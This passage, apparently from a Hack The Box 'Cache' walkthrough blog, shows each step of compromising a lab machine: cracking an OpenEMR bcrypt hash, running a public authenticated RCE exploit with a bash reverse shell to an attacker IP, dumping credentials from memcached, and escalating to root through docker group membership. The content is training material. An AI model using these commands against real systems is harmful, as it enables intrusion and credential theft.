+openemr_admin:<span class="nv">$2a$05$l2sTLIG6GTBeyBf7TAKL6</span>.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.
+</code></pre></div></div>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cfx:  ~/Documents/htb/cache
+→ john <span class="nt">--format</span><span class="o">=</span>bcrypt <span class="nt">-w</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt openemr_admin.hash
+Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>bcrypt <span class="o">[</span>Blowfish 32/64 X3]<span class="o">)</span>
+Cost 1 <span class="o">(</span>iteration count<span class="o">)</span> is 32 <span class="k">for </span>all loaded hashes
+Will run 4 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+xxxxxx           <span class="o">(</span>?<span class="o">)</span>
+1g 0:00:00:00 DONE 2/3 <span class="o">(</span>2020-10-14 16:40<span class="o">)</span> 1.666g/s 1920p/s 1920c/s 1920C/s water..88888888
+Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
+Session completed
+
+cfx:  ~/Documents/htb/cache
+→ john <span class="nt">--show</span> openemr_admin.hash
+openemr_admin:xxxxxx
+
+1 password <span class="nb">hash </span>cracked, 0 left
+</code></pre></div></div>
+<p>So we have credentials for OpenEMR as <code class="language-plaintext highlighter-rouge">openemr_admin:xxxxxx</code></p>
+
+<h2 id="openemr---rce">OpenEMR - RCE</h2>
+
+<p>With <code class="language-plaintext highlighter-rouge">searchsploit</code> I was able to see an Authenticated RCE exploit for our version:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cfx:  ~/Documents/htb/cache
+→ searchsploit openemr 5.0.1
+<span class="nt">------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+ Exploit Title                                                                                                                                              |  Path
+<span class="nt">------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+<span class="o">[</span>..SNIP..]
+
+OpenEMR &lt; 5.0.1 - <span class="o">(</span>Authenticated<span class="o">)</span> Remote Code Execution                                                                                                     | php/webapps/45161.py
+<span class="nt">------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">--------------------------------</span>
+</code></pre></div></div>
+
+<h2 id="shell-as-www-data">Shell as www-data</h2>
+
+<p>Going through exploit, we understand it expects username, password and the command to be executed as inputs.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cfx:  ~/Documents/htb/cache
+→ python2 45161.py http://hms.htb <span class="nt">-u</span> openemr_admin <span class="nt">-p</span> xxxxxx <span class="nt">-c</span> <span class="s1">'bash -i &gt;&amp;/dev/tcp/10.10.14.10/8020 0&gt;&amp;1'</span>
+ .---.  ,---.  ,---.  .-. .-.,---.          ,---.
+/ .-. <span class="o">)</span> | .-.<span class="se">\ </span>| .-<span class="s1">'  |  \| || .-'</span>  |<span class="se">\ </span>   /|| .-.<span class="se">\</span>
+| | |<span class="o">(</span>_<span class="o">)</span>| |-<span class="s1">' )| `-.  |   | || `-.  |(\  / || `-'</span>/
+| | | | | |--<span class="s1">' | .-'</span>  | |<span class="se">\ </span> <span class="o">||</span> .-<span class="s1">'  (_)\/  ||   (
+\ `-'</span> / | |    |  <span class="sb">`</span><span class="nt">--</span>.| | |<span class="o">)||</span>  <span class="sb">`</span><span class="nt">--</span>.| <span class="se">\ </span> / <span class="o">||</span> |<span class="se">\ \</span>
+ <span class="o">)</span><span class="nt">---</span><span class="s1">'  /(     /( __.'</span>/<span class="o">(</span>  <span class="o">(</span>_<span class="o">)</span>/<span class="o">(</span> __.<span class="s1">'| |\/| ||_| \)\
+(_)    (__)   (__)   (__)   (__)    '</span>-<span class="s1">'  '</span>-<span class="s1">'    (__)
+
+   ={   P R O J E C T    I N S E C U R I T Y   }=
+
+         Twitter : @Insecurity
+         Site    : insecurity.sh
+
+[$] Authenticating with openemr_admin:xxxxxx
+[$] Injecting payload
+
+</span></code></pre></div></div>
+
+<p>Getting a call back on <code class="language-plaintext highlighter-rouge">pwncat</code> listener:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cfx:  ~/Documents/htb/cache
+→ pwncat <span class="nt">-l</span> 8020 <span class="nt">-vv</span>
+INFO: Listening on :::8020 <span class="o">(</span>family 10/IPv6, TCP<span class="o">)</span>
+INFO: Listening on 0.0.0.0:8020 <span class="o">(</span>family 2/IPv4, TCP<span class="o">)</span>
+INFO: Client connected from 10.10.10.188:46344 <span class="o">(</span>family 2/IPv4, TCP<span class="o">)</span>
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1653<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+www-data@cache:/var/www/hms.htb/public_html/interface/main<span class="nv">$ </span><span class="nb">whoami
+whoami
+</span>www-data
+www-data@cache:/var/www/hms.htb/public_html/interface/main<span class="nv">$ </span>python3 <span class="nt">-c</span> <span class="s2">"import pty;pty.spawn('/bin/bash')"</span>
+python3 <span class="nt">-c</span> <span class="s2">"import pty;pty.spawn('/bin/bash')"</span>
+</code></pre></div></div>
+
+<h2 id="elevating-priv-www-data---ash">Elevating Priv: www-data -&gt; ash</h2>
+
+<p><code class="language-plaintext highlighter-rouge">user.txt</code> is located inside folder user <code class="language-plaintext highlighter-rouge">ash</code>:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@cache:/home/ash<span class="nv">$ </span><span class="nb">cat </span>user.txt
+<span class="nb">cat</span>: user.txt: Permission denied
+</code></pre></div></div>
+<p>Initially we discovered hardcoded credentials for user ash during HTTP enumeration, we can <code class="language-plaintext highlighter-rouge">su</code> to ash using <code class="language-plaintext highlighter-rouge">ash:H@v3_fun</code> and grab the user flag:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@cache:/home<span class="nv">$ </span>su ash
+Password:
+ash@cache:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
+fa1d99dc286be40<span class="k">*****************</span>
+</code></pre></div></div>
+<h2 id="elevating-priv-ash---luffy">Elevating Priv: ash -&gt; luffy</h2>
+
+<h3 id="enumeration">Enumeration</h3>
+
+<p>While checking <code class="language-plaintext highlighter-rouge">/etc/passwd</code> to find out users present on the box I could see along with <code class="language-plaintext highlighter-rouge">ash</code> and <code class="language-plaintext highlighter-rouge">luffy</code> there’s also a <code class="language-plaintext highlighter-rouge">memcache</code> user:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ash@cache:~<span class="nv">$ </span><span class="nb">cat</span> /etc/passwd
+<span class="nb">cat</span> /etc/passwd
+<span class="o">[</span>..SNIP..]
+ash:x:1000:1000:ash:/home/ash:/bin/bash
+luffy:x:1001:1001:,,,:/home/luffy:/bin/bash
+memcache:x:111:114:Memcached,,,:/nonexistent:/bin/false
+</code></pre></div></div>
+
+<p>On further checking we can confirm <code class="language-plaintext highlighter-rouge">memcache</code> is running on the box and traditionally 11211 is the default port for it.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ash@cache:~<span class="nv">$ </span>ss <span class="nt">-tnlp</span>
+ss <span class="nt">-tnlp</span>
+State    Recv-Q    Send-Q        Local Address:Port        Peer Address:Port
+LISTEN   0         128           127.0.0.53%lo:53               0.0.0.0:<span class="k">*</span>
+LISTEN   0         128                 0.0.0.0:22               0.0.0.0:<span class="k">*</span>
+LISTEN   0         80                127.0.0.1:3306             0.0.0.0:<span class="k">*</span>
+LISTEN   0         128               127.0.0.1:11211            0.0.0.0:<span class="k">*</span>
+LISTEN   0         128                       <span class="k">*</span>:80                     <span class="k">*</span>:<span class="k">*</span>
+LISTEN   0         128                    <span class="o">[</span>::]:22                  <span class="o">[</span>::]:<span class="k">*</span>
+</code></pre></div></div>
+
+<h3 id="memcached-service">Memcached Service</h3>
+
+<blockquote>
+  <p>Memcached is a general-purpose distributed memory-caching system. It is often used to speed up dynamic database-driven websites by caching data and objects in RAM to reduce the number of times an external data source must be read.</p>
+</blockquote>
+
+<p>Using this <a href="https://www.hackingarticles.in/penetration-testing-on-memcached-server/"><strong>article</strong></a> we can dump data from Memcached service.</p>
+
+<p>First, we’ll connect to service using telnet and start by checking the <code class="language-plaintext highlighter-rouge">version</code> of Memcached server:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ash@cache:~<span class="nv">$ </span>telnet localhost 11211
+telnet localhost 11211
+Trying ::1...
+Trying 127.0.0.1...
+Connected to localhost.
+Escape character is <span class="s1">'^]'</span><span class="nb">.</span>
+version
+version
+VERSION 1.5.6 Ubuntu
+</code></pre></div></div>
+<p>Next, we’ll use <code class="language-plaintext highlighter-rouge">stat slabs</code> which will provide us info if there are any active slabs, in this case we have 1:</p>
+
+<blockquote>
+  <p>A slab allocation is used to optimize memory usage and prevent memory fragmentation when information expires from the cache</p>
+</blockquote>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stats slabs
+STAT 1:chunk_size 96
+STAT 1:chunks_per_page 10922
+STAT 1:total_pages 1
+STAT 1:total_chunks 10922
+STAT 1:used_chunks 5
+STAT 1:free_chunks 10917
+STAT 1:free_chunks_end 0
+STAT 1:mem_requested 371
+STAT 1:get_hits 0
+STAT 1:cmd_set 8355
+STAT 1:delete_hits 0
+STAT 1:incr_hits 0
+STAT 1:decr_hits 0
+STAT 1:cas_hits 0
+STAT 1:cas_badval 0
+STAT 1:touch_hits 0
+STAT active_slabs 1
+STAT total_malloced 1048576
+END
+</code></pre></div></div>
+<p>Next, we’ll use <code class="language-plaintext highlighter-rouge">stat cachedump 1 0</code> to dump keys,  where <code class="language-plaintext highlighter-rouge">1</code> is the slab number and <code class="language-plaintext highlighter-rouge">0</code> denotes to dump all keys.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stats cachedump 1 0
+ITEM <span class="nb">link</span> <span class="o">[</span>21 b<span class="p">;</span> 0 s]
+ITEM user <span class="o">[</span>5 b<span class="p">;</span> 0 s]
+ITEM passwd <span class="o">[</span>9 b<span class="p">;</span> 0 s]
+ITEM file <span class="o">[</span>7 b<span class="p">;</span> 0 s]
+ITEM account <span class="o">[</span>9 b<span class="p">;</span> 0 s]
+END
+</code></pre></div></div>
+<p>Then, using <code class="language-plaintext highlighter-rouge">get</code> command followed by key name to get the data inside key:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>get <span class="nb">link
+</span>VALUE <span class="nb">link </span>0 21
+https://hackthebox.eu
+END
+
+get user
+VALUE user 0 5
+luffy
+END
+
+get passwd
+VALUE passwd 0 9
+0n3_p1ec3
+END
+
+get file
+VALUE file 0 7
+nothing
+END
+
+get account
+VALUE account 0 9
+afhj556uo
+END
+</code></pre></div></div>
+<p>Got credentials of user luffy as <code class="language-plaintext highlighter-rouge">luffy:0n3_p1ec3</code></p>
+
+<h3 id="ssh-as-luffy">SSH as luffy</h3>
+
+<p>We can SSH to the server using luffy’s credentials:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cfx:  ~/Documents/htb/cache
+→ ssh luffy@10.10.10.188
+The authenticity of host <span class="s1">'10.10.10.188 (10.10.10.188)'</span> can<span class="s1">'t be established.
+ECDSA key fingerprint is SHA256:/qQ34g2zzGVlmbMIKeD7JhlhDf/SPzgYFz000v+3KBI.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '</span>10.10.10.188<span class="s1">' (ECDSA) to the list of known hosts.
+luffy@10.10.10.188'</span>s password:
+Welcome to Ubuntu 18.04.2 LTS <span class="o">(</span>GNU/Linux 4.15.0-109-generic x86_64<span class="o">)</span>
+
+ <span class="k">*</span> Documentation:  https://help.ubuntu.com
+ <span class="k">*</span> Management:     https://landscape.canonical.com
+ <span class="k">*</span> Support:        https://ubuntu.com/advantage
+
+  System information as of Wed Oct 14 14:05:47 UTC 2020
+
+  System load:  0.14              Processes:              185
+  Usage of /:   75.3% of 8.06GB   Users logged <span class="k">in</span>:        0
+  Memory usage: 22%               IP address <span class="k">for </span>ens160:  10.10.10.188
+  Swap usage:   0%                IP address <span class="k">for </span>docker0: 172.17.0.1
+
+
+ <span class="k">*</span> Canonical Livepatch is available <span class="k">for </span>installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+110 packages can be updated.
+0 updates are security updates.
+
+
+Last login: Wed May  6 08:54:44 2020 from 10.10.14.3
+luffy@cache:~<span class="nv">$ </span><span class="nb">whoami
+</span>luffy
+</code></pre></div></div>
+
+<h2 id="elevating-priv-luffy---root">Elevating Priv: luffy -&gt; root</h2>
+
+<p>User luffy is a member of docker group:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>luffy@cache:~<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>luffy<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>luffy<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>luffy<span class="o">)</span>,999<span class="o">(</span>docker<span class="o">)</span>
+</code></pre></div></div>
+<p>There’s already an ubuntu image on the box, so we can leverage it to escalate to root referring <a href="https://gtfobins.github.io/gtfobins/docker/"><strong>gtfo</strong></a>:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>luffy@cache:~<span class="nv">$ </span>docker images
+REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
+ubuntu              latest              2ca708c1c9cc        13 months ago       64.2MB
+</code></pre></div></div>
+<h4 id="docker-privesc">Docker privesc</h4>
+<p>We’ll launch the image as a container and mount the root file system into it which will drop us a shell:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>luffy@cache:~<span class="nv">$ </span>docker run <span class="nt">-v</span> /:/mnt <span class="nt">--rm</span> <span class="nt">-it</span> ubuntu <span class="nb">chroot</span> /mnt sh
+<span class="c"># id</span>
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</code></pre></div></div>
+
+<h4 id="grabbing-roottxt">Grabbing root.txt</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># cat /root/root.txt
+c4b77e278753a0******************
+
+</code></pre></div></div>
+<p>And we pwned the Box !</p>
+
+<p>Thanks for reading, Suggestions &amp; Feedback are appreciated !</p>
+:ET
